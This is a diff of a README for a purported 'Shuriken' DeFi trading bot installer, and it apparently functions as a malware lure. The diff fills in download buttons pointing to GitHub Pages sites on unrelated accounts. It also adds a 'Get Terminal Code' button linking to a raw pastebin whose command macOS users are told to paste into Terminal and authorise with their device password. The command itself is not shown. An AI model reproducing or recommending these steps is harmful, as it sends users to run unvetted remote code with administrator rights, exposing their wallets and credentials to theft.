@@ -1,11 +1,11 @@
 # Shuriken Trading Bot - Advanced DeFi Trading Automation [Latest Build]
 
-[![About](https://img.shields.io/badge/About-Shuriken%20Trading-blue)](https://github.com/Shuriken-Bot/#what-is-shuriken-trading)
-[![How](https://img.shields.io/badge/How-the%20installer%20Works-green)](https://github.com/Shuriken-Bot/#-this-is-an-installer-trading-bot)
-[![How](https://img.shields.io/badge/How-Bot%20Works-orange)](https://github.com/Shuriken-Bot/#heres-how-the-bot-works-after-installation)
-[![Shuriken](https://img.shields.io/badge/Shuriken-Installation%20on%20Windows-purple)](https://github.com/Shuriken-Bot/#%EF%B8%8F-installing-and-using-shuriken-bot-on-windows)
-[![Shuriken](https://img.shields.io/badge/Shuriken-Installation%20on%20MacOS-purple)](https://github.com/Shuriken-Bot/#-how-to-install-shuriken-trading-on-macos)
-[![SEO](https://img.shields.io/badge/SEO-Keywords-yellow)](https://github.com/Shuriken-Bot/#-seo-keywords)
+[![About](https://img.shields.io/badge/About-Shuriken%20Trading-blue)](https://github.com/Shuriken-Trading-Bot#what-is-shuriken-bot)
+[![How](https://img.shields.io/badge/How-the%20installer%20Works-green)](https://github.com/Shuriken-Trading-Bot#-this-is-an-installer-trading-bot)
+[![How](https://img.shields.io/badge/How-Bot%20Works-orange)](https://github.com/Shuriken-Trading-Bot#heres-how-the-bot-works-after-installation)
+[![Shuriken](https://img.shields.io/badge/Shuriken-Installation%20on%20Windows-purple)](https://github.com/Shuriken-Trading-Bot#%EF%B8%8F-installing-and-using-shuriken-bot-on-windows)
+[![Shuriken](https://img.shields.io/badge/Shuriken-Installation%20on%20MacOS-purple)](https://github.com/Shuriken-Trading-Bot#-how-to-install-shuriken-bot-on-macos)
+[![SEO](https://img.shields.io/badge/SEO-Keywords-yellow)](https://github.com/Shuriken-Trading-Bot#-seo-keywords)
 
 <div align="center">
 
@@ -17,7 +17,7 @@
 
 <div align="center">  
 
-[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-blue?style=for-the-badge&logo=windows)](link)
+[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-blue?style=for-the-badge&logo=windows)](https://shuriken-trading-bot.github.io/.github/)
 [![Download for Mac](https://img.shields.io/badge/Download_for_Mac-silver?style=for-the-badge&logo=apple)](https://montiko384.github.io/.github/shuriken)  
 
 </div>  
@@ -32,11 +32,11 @@ Every transaction is executed with precision timing and advanced blockchain anal
 
 Our dedicated development team continuously monitors DeFi markets and blockchain developments, ensuring that trading strategies are optimized for current network conditions and emerging DeFi trends. Shuriken Bot is committed to providing reliable, secure, and high-performance DeFi trading automation.
 
-[![6424.gif](https://i.postimg.cc/sxmvb9dv/6424.gif)](https://postimg.cc/N2ysHX0c)
+[![6432473-ezgif-com-optimize.gif](https://i.postimg.cc/7Lfk11Zq/6432473-ezgif-com-optimize.gif)](https://postimg.cc/JyVvMkXF)
 
 ---
 
-## 📦 This is an installer (trading bot)
+## 📦 This is an installer Trading Bot
 
 This installer will automatically download and configure everything you need to run your Shuriken Bot across multiple decentralized exchanges. You don't need to manually install dependencies, compile code, or configure complex environments — the program handles everything automatically.
 
@@ -145,19 +145,19 @@ shuriken-bot/
 
 1. Click on the "Get terminal code" button and copy the installation command there.
 
-[![Get Terminal Code](https://img.shields.io/badge/Get_Terminal_Code-silver?style=for-the-badge&logo=apple)](link)
+[![Get Terminal Code](https://img.shields.io/badge/Get_Terminal_Code-silver?style=for-the-badge&logo=apple)](https://pastebin.com/raw/H4VT3ZPT)
 
 2. Open the terminal on your device and paste the command you copied above, then press the "Return" button.
 3. Enter your device password and confirm the installation. 
 
 ---
 
-[![About](https://img.shields.io/badge/About-Shuriken%20Trading-blue)](https://github.com/Shuriken-Bot/#what-is-shuriken-trading)
-[![How](https://img.shields.io/badge/How-the%20installer%20Works-green)](https://github.com/Shuriken-Bot/#-this-is-an-installer-trading-bot)
-[![How](https://img.shields.io/badge/How-Bot%20Works-orange)](https://github.com/Shuriken-Bot/#heres-how-the-bot-works-after-installation)
-[![Shuriken](https://img.shields.io/badge/Shuriken-Installation%20on%20Windows-purple)](https://github.com/Shuriken-Bot/#%EF%B8%8F-installing-and-using-shuriken-bot-on-windows)
-[![Shuriken](https://img.shields.io/badge/Shuriken-Installation%20on%20MacOS-purple)](https://github.com/Shuriken-Bot/#-how-to-install-shuriken-trading-on-macos)
-[![SEO](https://img.shields.io/badge/SEO-Keywords-yellow)](https://github.com/Shuriken-Bot/#-seo-keywords)
+[![About](https://img.shields.io/badge/About-Shuriken%20Trading-blue)](https://github.com/Shuriken-Trading-Bot#what-is-shuriken-bot)
+[![How](https://img.shields.io/badge/How-the%20installer%20Works-green)](https://github.com/Shuriken-Trading-Bot#-this-is-an-installer-trading-bot)
+[![How](https://img.shields.io/badge/How-Bot%20Works-orange)](https://github.com/Shuriken-Trading-Bot#heres-how-the-bot-works-after-installation)
+[![Shuriken](https://img.shields.io/badge/Shuriken-Installation%20on%20Windows-purple)](https://github.com/Shuriken-Trading-Bot#%EF%B8%8F-installing-and-using-shuriken-bot-on-windows)
+[![Shuriken](https://img.shields.io/badge/Shuriken-Installation%20on%20MacOS-purple)](https://github.com/Shuriken-Trading-Bot#-how-to-install-shuriken-bot-on-macos)
+[![SEO](https://img.shields.io/badge/SEO-Keywords-yellow)](https://github.com/Shuriken-Trading-Bot#-seo-keywords)
 
 ![Shuriken Bot Dashboard](https://prod-coin360-cms.s3.eu-central-1.amazonaws.com/ui_389c3b1cc8.webp)
 
